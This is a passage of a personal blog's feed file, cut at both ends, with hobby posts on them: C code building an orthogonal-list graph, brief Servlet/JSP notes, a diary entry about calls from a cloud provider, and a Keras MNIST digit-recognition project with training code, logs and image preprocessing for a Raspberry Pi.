G.xlist[v2].firstin=G.xlist[v1].firstout=p;</span><br><span class="line">        <span class="keyword">if</span>(IncInfo) Input(*p-&gt;info);</span><br><span class="line">        swap(v1, v2);</span><br><span class="line">        v1=LocateVec(G, v1); v2=LocateVec(G, v2);</span><br><span class="line">        ArcBox *q=(ArcBox *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(ArcBox));</span><br><span class="line">        *q=&#123;v1, v2, G.xlist[v2].firstin, G.xlist[v1].firstout, <span class="literal">NULL</span>&#125;;</span><br><span class="line">        G.xlist[v2].firstin=G.xlist[v1].firstout=q;</span><br><span class="line">        <span class="keyword">if</span>(IncInfo) *(q-&gt;info)=*p-&gt;info;</span><br><span class="line">    &#125; <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">Status <span class="title">CreateUDN</span><span class="params">(OLGraph &amp;G)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> IncInfo;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d%d%d"</span>, &amp;G.vexnum, &amp;G.arcnum, &amp;IncInfo);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;G.vexnum; i++) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;G.xlist[i].data);</span><br><span class="line">        G.xlist[i].firstin=<span class="literal">NULL</span>, G.xlist[i].firstout=<span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>; k&lt;G.arcnum; k++) &#123;</span><br><span class="line">        <span class="keyword">int</span> v1, v2;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>, &amp;v1, &amp;v2);</span><br><span class="line">        v1=LocateVec(G, v1); v2=LocateVec(G, v2);</span><br><span class="line">        ArcBox *p=(ArcBox *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(ArcBox));</span><br><span class="line">        *p=&#123;v1, v2, G.xlist[v2].firstin, G.xlist[v1].firstout, <span class="literal">NULL</span>&#125;;</span><br><span class="line">        G.xlist[v2].firstin=G.xlist[v1].firstout=p;</span><br><span class="line">        <span class="keyword">if</span>(IncInfo) Input(*p-&gt;info);</span><br><span class="line">        swap(v1, v2);</span><br><span class="line">        v1=LocateVec(G, v1); v2=LocateVec(G, v2);</span><br><span class="line">        ArcBox *q=(ArcBox *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(ArcBox));</span><br><span class="line">        *q=&#123;v1, v2, G.xlist[v2].firstin, G.xlist[v1].firstout, <span class="literal">NULL</span>&#125;;</span><br><span class="line">        G.xlist[v2].firstin=G.xlist[v1].firstout=q;</span><br><span class="line">        <span class="keyword">if</span>(IncInfo) *(q-&gt;info)=*p-&gt;info;</span><br><span class="line">    &#125; <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">Status <span class="title">CreateGraph</span><span class="params">(OLGraph &amp;G)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;G.kind);</span><br><span class="line">    <span class="keyword">switch</span>(G.kind) &#123;</span><br><span class="line">        <span class="keyword">case</span> DG: <span class="keyword">return</span> CreateDG(G);</span><br><span class="line">        <span class="keyword">case</span> DN: <span class="keyword">return</span> CreateDN(G);</span><br><span class="line">        <span class="keyword">case</span> UDG: <span class="keyword">return</span> CreateUDG(G);</span><br><span class="line">        <span class="keyword">case</span> UDN: <span class="keyword">return</span> CreateUDN(G);</span><br><span class="line">        <span class="keyword">default</span>: <span class="keyword">return</span> ERROR;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">/* p152 graph7.9</span></span><br><span class="line"><span class="comment">1 6 10 1</span></span><br><span class="line"><span class="comment">0 1 5</span></span><br><span class="line"><span class="comment">0 3 7</span></span><br><span class="line"><span class="comment">1 2 4</span></span><br><span class="line"><span class="comment">2 0 8</span></span><br><span class="line"><span class="comment">2 5 9</span></span><br><span class="line"><span class="comment">3 2 5</span></span><br><span class="line"><span class="comment">3 5 6</span></span><br><span class="line"><span class="comment">4 3 5</span></span><br><span class="line"><span class="comment">5 0 3</span></span><br><span class="line"><span class="comment">5 4 1</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    OLGraph G;</span><br><span class="line">    CreateGraph(G);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    test();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> note </tag>
            
            <tag> datastructure </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Servlet &amp; JSP笔记</title>
      <link href="/blog/note-servlet-and-jsp/"/>
      <url>/blog/note-servlet-and-jsp/</url>
      
        <content type="html"><![CDATA[<h2 id="Inter-Servlet-Communication"><a href="#Inter-Servlet-Communication" class="headerlink" title="Inter-Servlet Communication"></a>Inter-Servlet Communication</h2><h3 id="Request-Dispatcher-Object"><a href="#Request-Dispatcher-Object" class="headerlink" title="Request Dispatcher Object"></a>Request Dispatcher Object</h3><p>Request dispatcher is an object of the javax.servlet.RequestDispatcher interface that allows inter-servlet communication. You can use Request Dispatcher to forward/include a request to another resource.</p><h2 id="JSP-Technology"><a href="#JSP-Technology" class="headerlink" title="JSP Technology"></a>JSP Technology</h2>]]></content>
      
      
      <categories>
          
          <category> note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> note </tag>
            
            <tag> servlet </tag>
            
            <tag> jsp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20190902</title>
      <link href="/blog/20190902/"/>
      <url>/blog/20190902/</url>
      
        <content type="html"><![CDATA[<p>最近感冒了…真的难受啊wc…<br>今天上第三节课前还接到了百度智能云的电话？？？<br>话说现在这个服务都开始这样调研了吗…<br>说看我最近使用了百度智能云，问我使用的什么功能<br>我当然使用的是语音合成咯，然后又问我遇到什么困难…<br>我说都有文档，挺简单的…<br>问我是个人还是企业什么的…我人晕了</p><p>然后下午又打来了电话wdnmd，问我要不要服务器？？？？？？？敢情用户调查来人工精准投放广告来了？？？？</p>]]></content>
      
      
      <categories>
          
          <category> daily </category>
          
      </categories>
      
      
        <tags>
            
            <tag> daily </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>用树莓派做数字识别并语音播报</title>
      <link href="/blog/iot-mnist/"/>
      <url>/blog/iot-mnist/</url>
      
        <content type="html"><![CDATA[<h2 id="MNIST-Model"><a href="#MNIST-Model" class="headerlink" title="MNIST Model"></a>MNIST Model</h2><p>MNIST 本来keras就提供了数据集，直接建好model train就行了<br>model是我自己随便建的一个标准CNN，相关结构<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">_________________________________________________________________</span><br><span class="line">Layer (type)                 Output Shape              Param #   </span><br><span class="line">=================================================================</span><br><span class="line">conv2d_1 (Conv2D)            (None, 28, 28, 32)        320       </span><br><span class="line">_________________________________________________________________</span><br><span class="line">activation_1 (Activation)    (None, 28, 28, 32)        0         </span><br><span class="line">_________________________________________________________________</span><br><span class="line">max_pooling2d_1 (MaxPooling2 (None, 14, 14, 32)        0         </span><br><span class="line">_________________________________________________________________</span><br><span class="line">dropout_1 (Dropout)          (None, 14, 14, 32)        0         </span><br><span class="line">_________________________________________________________________</span><br><span class="line">conv2d_2 (Conv2D)            (None, 14, 14, 64)        18496     </span><br><span class="line">_________________________________________________________________</span><br><span class="line">activation_2 (Activation)    (None, 14, 14, 64)        0         </span><br><span class="line">_________________________________________________________________</span><br><span class="line">max_pooling2d_2 (MaxPooling2 (None, 7, 7, 64)          0         </span><br><span class="line">_________________________________________________________________</span><br><span class="line">dropout_2 (Dropout)          (None, 7, 7, 64)          0         </span><br><span class="line">_________________________________________________________________</span><br><span class="line">flatten_1 (Flatten)          (None, 3136)              0         </span><br><span class="line">_________________________________________________________________</span><br><span class="line">dense_1 (Dense)              (None, 128)               401536    </span><br><span class="line">_________________________________________________________________</span><br><span class="line">activation_3 (Activation)    (None, 128)               0         </span><br><span class="line">_________________________________________________________________</span><br><span class="line">dropout_3 (Dropout)          (None, 128)               0         </span><br><span class="line">_________________________________________________________________</span><br><span class="line">dense_2 (Dense)              (None, 64)                8256      </span><br><span class="line">_________________________________________________________________</span><br><span class="line">activation_4 (Activation)    (None, 64)                0         </span><br><span class="line">_________________________________________________________________</span><br><span class="line">dropout_4 (Dropout)          (None, 64)                0         </span><br><span class="line">_________________________________________________________________</span><br><span class="line">dense_3 (Dense)              (None, 10)                650       </span><br><span class="line">=================================================================</span><br><span class="line">Total params: 429,258</span><br><span class="line">Trainable params: 429,258</span><br><span class="line">Non-trainable params: 0</span><br></pre></td></tr></table></figure></p><p>训练code<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> keras.models <span class="keyword">import</span> Sequential</span><br><span class="line"><span class="keyword">from</span> keras.layers.core <span class="keyword">import</span> Dense, Dropout, Activation</span><br><span class="line"><span class="keyword">from</span> keras.layers <span class="keyword">import</span> Convolution2D, MaxPooling2D, Flatten, BatchNormalization</span><br><span class="line"><span class="keyword">from</span> keras.optimizers <span class="keyword">import</span> SGD, Adam, Adadelta</span><br><span class="line"><span class="keyword">from</span> keras.utils <span class="keyword">import</span> np_utils</span><br><span class="line"><span class="keyword">from</span> keras.datasets <span class="keyword">import</span> mnist</span><br><span class="line"><span class="keyword">from</span> keras <span class="keyword">import</span> initializers, regularizers</span><br><span class="line"><span class="keyword">from</span> keras.models <span class="keyword">import</span> load_model</span><br><span class="line"><span class="keyword">from</span> keras.layers.normalization <span class="keyword">import</span> BatchNormalization</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">load_data</span><span class="params">()</span>:</span></span><br><span class="line">    (x_train, y_train), (x_test, y_test) = mnist.load_data()</span><br><span class="line">    number = len(x_train)</span><br><span class="line">    x_train = x_train[<span class="number">0</span>:number]</span><br><span class="line">    y_train = y_train[<span class="number">0</span>:number]</span><br><span class="line">    x_train = x_train.reshape(number, <span class="number">28</span>, <span class="number">28</span>, <span class="number">1</span>)</span><br><span class="line">    x_test = x_test.reshape(x_test.shape[<span class="number">0</span>], <span class="number">28</span>, <span class="number">28</span>, <span class="number">1</span>)</span><br><span class="line">    x_train = x_train.astype(<span class="string">'float32'</span>)</span><br><span class="line">    x_test = x_test.astype(<span class="string">'float32'</span>)</span><br><span class="line">    </span><br><span class="line">    y_train = np_utils.to_categorical(y_train, <span class="number">10</span>)</span><br><span class="line">    y_test = np_utils.to_categorical(y_test, <span class="number">10</span>)</span><br><span class="line">    x_train = x_train</span><br><span class="line">    x_test = x_test</span><br><span class="line">    x_train = x_train / <span class="number">255</span></span><br><span class="line">    x_test = x_test / <span class="number">255</span></span><br><span class="line">    <span class="comment">#x_test = np.random.normal(x_test)</span></span><br><span class="line">    <span class="keyword">return</span> (x_train, y_train), (x_test, y_test)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_model</span><span class="params">()</span>:</span></span><br><span class="line">    model = Sequential()</span><br><span class="line">    model.add(Convolution2D(<span class="number">32</span>, kernel_size=<span class="number">3</span>, strides=<span class="number">1</span>, padding=<span class="string">"same"</span>, input_shape=(<span class="number">28</span>, <span class="number">28</span>, <span class="number">1</span>), kernel_initializer=initializers.he_normal(seed=<span class="keyword">None</span>)))</span><br><span class="line">    <span class="comment">#model.add(BatchNormalization(axis=-1))</span></span><br><span class="line">    model.add(Activation(<span class="string">"relu"</span>))</span><br><span class="line">    model.add(MaxPooling2D(pool_size=(<span class="number">2</span>, <span class="number">2</span>), strides=<span class="number">2</span>))</span><br><span class="line">    model.add(Dropout(<span class="number">0.3</span>))</span><br><span class="line">    </span><br><span class="line">    model.add(Convolution2D(<span class="number">64</span>, kernel_size=<span class="number">3</span>, strides=<span class="number">1</span>, padding=<span class="string">"same"</span>, kernel_initializer=initializers.he_normal(seed=<span class="keyword">None</span>)))</span><br><span class="line">    <span class="comment">#model.add(BatchNormalization(axis=-1))</span></span><br><span class="line">    model.add(Activation(<span class="string">"relu"</span>))</span><br><span class="line">    model.add(MaxPooling2D(pool_size=(<span class="number">2</span>, <span class="number">2</span>), strides=<span class="number">2</span>))</span><br><span class="line">    model.add(Dropout(<span class="number">0.3</span>))</span><br><span class="line"></span><br><span class="line">    <span class="string">'''    </span></span><br><span class="line"><span class="string">    model.add(Convolution2D(256, kernel_size=3, strides=1, padding="same", kernel_initializer=initializers.he_normal(seed=None)))</span></span><br><span class="line"><span class="string">    model.add(BatchNormalization(axis=-1))</span></span><br><span class="line"><span class="string">    model.add(Activation("relu"))</span></span><br><span class="line"><span class="string">    model.add(MaxPooling2D(pool_size=(2, 2), strides=2))</span></span><br><span class="line"><span class="string">    model.add(Dropout(0.3))</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    model.add(Convolution2D(512, kernel_size=3, strides=1, padding="same", kernel_initializer=initializers.he_normal(seed=None)))</span></span><br><span class="line"><span class="string">    model.add(BatchNormalization(axis=-1))</span></span><br><span class="line"><span class="string">    model.add(Activation("relu"))</span></span><br><span class="line"><span class="string">    model.add(MaxPooling2D(pool_size=(2, 2), strides=2))</span></span><br><span class="line"><span class="string">    model.add(Dropout(0.4))</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line"></span><br><span class="line">    model.add(Flatten())</span><br><span class="line">    model.add(Dense(<span class="number">128</span>, kernel_initializer=initializers.he_normal(seed=<span class="keyword">None</span>)))</span><br><span class="line">    <span class="comment">#model.add(BatchNormalization(axis=-1))</span></span><br><span class="line">    model.add(Activation(<span class="string">"relu"</span>))</span><br><span class="line">    model.add(Dropout(<span class="number">0.5</span>))</span><br><span class="line"></span><br><span class="line">    model.add(Dense(<span class="number">64</span>, kernel_initializer=initializers.he_normal(seed=<span class="keyword">None</span>)))</span><br><span class="line">    <span class="comment">#model.add(BatchNormalization(axis=-1))</span></span><br><span class="line">    model.add(Activation(<span class="string">"relu"</span>))</span><br><span class="line">    model.add(Dropout(<span class="number">0.5</span>))</span><br><span class="line">        </span><br><span class="line">    model.add(Dense(units = <span class="number">10</span>, activation=<span class="string">'softmax'</span>))</span><br><span class="line">    <span class="comment">#model.compile(loss='categorical_crossentropy', optimizer=SGD(lr=0.1), metrics=['accuracy'])</span></span><br><span class="line">    model.compile(loss=<span class="string">'categorical_crossentropy'</span>, optimizer=Adam(), metrics=[<span class="string">'accuracy'</span>])</span><br><span class="line">    <span class="comment">#model.compile(loss='categorical_crossentropy', optimizer=Adadelta(), metrics=['accuracy'])</span></span><br><span class="line">    model.summary()</span><br><span class="line">    <span class="keyword">return</span> model</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">train</span><span class="params">(model, x_train, y_train, x_test, y_test)</span>:</span></span><br><span class="line">    model.fit(x_train, y_train, batch_size=<span class="number">100</span>, epochs=<span class="number">10</span>, verbose=<span class="number">1</span>, validation_data=(x_test, y_test))</span><br><span class="line">    model.save(<span class="string">'my_model.h5'</span>)</span><br><span class="line">    result = model.evaluate(x_train, y_train, batch_size=<span class="number">100</span>)</span><br><span class="line">    print(<span class="string">'\nTrain Acc:'</span>, result[<span class="number">1</span>])</span><br><span class="line">    result = model.evaluate(x_test, y_test, batch_size=<span class="number">100</span>)</span><br><span class="line">    print(<span class="string">'\nVal Acc:'</span>, result[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    (x_train, y_train), (x_test, y_test) = load_data()</span><br><span class="line">    model = make_model()</span><br><span class="line">    train(model, x_train, y_train, x_test, y_test)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></p><p>训练结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">Epoch 1/10</span><br><span class="line">60000/60000 [==============================] - 44s 731us/step - loss: 0.8629 - acc: 0.7166 - val_loss: 0.1141 - val_acc: 0.9665</span><br><span class="line">Epoch 2/10</span><br><span class="line">60000/60000 [==============================] - 42s 705us/step - loss: 0.2981 - acc: 0.9172 - val_loss: 0.0784 - val_acc: 0.9760</span><br><span class="line">Epoch 3/10</span><br><span class="line">60000/60000 [==============================] - 44s 730us/step - loss: 0.2155 - acc: 0.9422 - val_loss: 0.0584 - val_acc: 0.9823</span><br><span class="line">Epoch 4/10</span><br><span class="line">60000/60000 [==============================] - 44s 733us/step - loss: 0.1742 - acc: 0.9541 - val_loss: 0.0459 - val_acc: 0.9872</span><br><span class="line">Epoch 5/10</span><br><span class="line">60000/60000 [==============================] - 43s 717us/step - loss: 0.1531 - acc: 0.9597 - val_loss: 0.0407 - val_acc: 0.9886</span><br><span class="line">Epoch 6/10</span><br><span class="line">60000/60000 [==============================] - 43s 719us/step - loss: 0.1364 - acc: 0.9645 - val_loss: 0.0374 - val_acc: 0.9888</span><br><span class="line">Epoch 7/10</span><br><span class="line">60000/60000 [==============================] - 44s 727us/step - loss: 0.1251 - acc: 0.9662 - val_loss: 0.0392 - val_acc: 0.9891</span><br><span class="line">Epoch 8/10</span><br><span class="line">60000/60000 [==============================] - 43s 720us/step - loss: 0.1105 - acc: 0.9702 - val_loss: 0.0338 - val_acc: 0.9897</span><br><span class="line">Epoch 9/10</span><br><span class="line">60000/60000 [==============================] - 47s 790us/step - loss: 0.1047 - acc: 0.9723 - val_loss: 0.0340 - val_acc: 0.9893</span><br><span class="line">Epoch 10/10</span><br><span class="line">60000/60000 [==============================] - 50s 840us/step - loss: 0.1024 - acc: 0.9729 - val_loss: 0.0306 - val_acc: 0.9919</span><br><span class="line">60000/60000 [==============================] - 9s 152us/step</span><br><span class="line"></span><br><span class="line">Train Acc: 0.9932833393414815</span><br><span class="line">10000/10000 [==============================] - 2s 183us/step</span><br><span class="line"></span><br><span class="line">Val Acc: 0.9919000059366226</span><br></pre></td></tr></table></figure></p><p>提出训练集数据看一下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> keras.utils <span class="keyword">import</span> np_utils</span><br><span class="line"><span class="keyword">from</span> keras.datasets <span class="keyword">import</span> mnist</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">load_data</span><span class="params">()</span>:</span></span><br><span class="line">    (x_train, y_train), (x_test, y_test) = mnist.load_data()</span><br><span class="line">    print(<span class="string">'len'</span>, len(x_train))</span><br><span class="line">    number = <span class="number">10000</span></span><br><span class="line">    x_train = x_train[<span class="number">0</span>:number]</span><br><span class="line">    y_train = y_train[<span class="number">0</span>:number]</span><br><span class="line">    x_train = x_train.reshape(number, <span class="number">28</span>, <span class="number">28</span>)</span><br><span class="line">    x_test = x_test.reshape(x_test.shape[<span class="number">0</span>], <span class="number">28</span>, <span class="number">28</span>)</span><br><span class="line">    x_train = x_train.astype(<span class="string">'float32'</span>)</span><br><span class="line">    x_test = x_test.astype(<span class="string">'float32'</span>)</span><br><span class="line">    </span><br><span class="line">    x_train = x_train</span><br><span class="line">    x_test = x_test</span><br><span class="line">    x_train = x_train / <span class="number">255</span></span><br><span class="line">    x_test = x_test / <span class="number">255</span></span><br><span class="line">    <span class="keyword">return</span> (x_train, y_train), (x_test, y_test)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(x_train, y_train)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        plt.imshow(x_train[i], cmap=<span class="string">'gray'</span>, interpolation=<span class="string">'none'</span>)</span><br><span class="line">        plt.axis(<span class="string">'off'</span>)</span><br><span class="line">        plt.savefig(<span class="string">'pic'</span>+str(i)+<span class="string">'.jpg'</span>)</span><br><span class="line">        plt.show()</span><br><span class="line">        print(i, y_train[i])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    (x_train, y_train), (x_test, y_test) = load_data()</span><br><span class="line">    show(x_train, y_train)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></p><hr><style>.img-mywrap{    border: 1px }.myimg{    float: left;    width: 20%;}</style><p><br></p><div class="img-mywrap"><img class="myimg" src="/img/iot-mnist/pic0.jpg"><img class="myimg" src="/img/iot-mnist/pic1.jpg"><img class="myimg" src="/img/iot-mnist/pic2.jpg"><img class="myimg" src="/img/iot-mnist/pic3.jpg"><img class="myimg" src="/img/iot-mnist/pic4.jpg"></div><div class="img-mywrap"><img class="myimg" src="/img/iot-mnist/pic5.jpg"><img class="myimg" src="/img/iot-mnist/pic6.jpg"><img class="myimg" src="/img/iot-mnist/pic7.jpg"><img class="myimg" src="/img/iot-mnist/pic8.jpg"><img class="myimg" src="/img/iot-mnist/pic9.jpg"></div><hr><p>然后我手写了几个数字，但是每个数字都要占满整张图片，所以我把他们分别截成了几张<br><br></p><div class="img-mywrap"><img class="myimg" src="/img/iot-mnist/0.png"><img class="myimg" src="/img/iot-mnist/1.png"><img class="myimg" src="/img/iot-mnist/2.png"><img class="myimg" src="/img/iot-mnist/3.png"><img class="myimg" src="/img/iot-mnist/4.png"></div><div class="img-mywrap"><img class="myimg" src="/img/iot-mnist/5.png"><img class="myimg" src="/img/iot-mnist/6.png"><img class="myimg" src="/img/iot-mnist/7.png"><img class="myimg" src="/img/iot-mnist/8.png"><img class="myimg" src="/img/iot-mnist/9.png"></div><hr><p>然后处理一下图片</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> w <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    img = Image.open(str(w)+<span class="string">'.png'</span>)</span><br><span class="line">    reImg = img.resize((<span class="number">28</span>, <span class="number">28</span>), Image.ANTIALIAS)</span><br><span class="line">    img_arr = np.array(reImg.convert(<span class="string">'L'</span>))</span><br><span class="line">    threshold = <span class="number">110</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">28</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">28</span>):</span><br><span class="line">            img_arr[i][j] = <span class="number">255</span>-img_arr[i][j]</span><br><span class="line">            <span class="keyword">if</span>(img_arr[i][j] &lt; threshold):</span><br><span class="line">                img_arr[i][j] = <span class="number">0</span></span><br><span class="line">                print(<span class="string">'1'</span>, end=<span class="string">''</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                img_arr[i][j] = <span class="number">255</span></span><br><span class="line">                print(<span class="string">'0'</span>, end=<span class="string">''</span>)</span><br><span class="line">        print(<span class="string">''</span>)</span><br><span class="line">    print(<span class="string">''</span>)</span><br><span class="line">    plt.imshow(img_arr, cmap=<span class="string">'gray'</span>, interpolation=<span class="string">'none'</span>)</span><br><span class="line">    plt.axis(<span class="string">'off'</span>)</span><br><span class="line">    plt.savefig(<span class="string">'deal_img'</span>+str(w)+<span class="string">'.jpg'</span>)</span><br><span class="line">    plt.show()</span><br></pre></td></tr></table></figure><hr><p>处理后<br><br></p><div class="img-mywrap"><img class="myimg" src="/img/iot-mnist/deal_img0.jpg"><img class="myimg" src="/img/iot-mnist/deal_img1.jpg"><img class="myimg" src="/img/iot-mnist/deal_img2.jpg"><img class="myimg" src="/img/iot-mnist/deal_img3.jpg"><img class="myimg" src="/img/iot-mnist/deal_img4.jpg"></div><div class="img-mywrap"><img class="myimg" src="/img/iot-mnist/deal_img5.jpg"><img class="myimg" src="/img/iot-mnist/deal_img6.jpg"><img class="myimg" src="/img/iot-mnist/deal_img7.jpg"><img class="myimg" src="/img/iot-mnist/deal_img8.jpg"><img class="myimg" 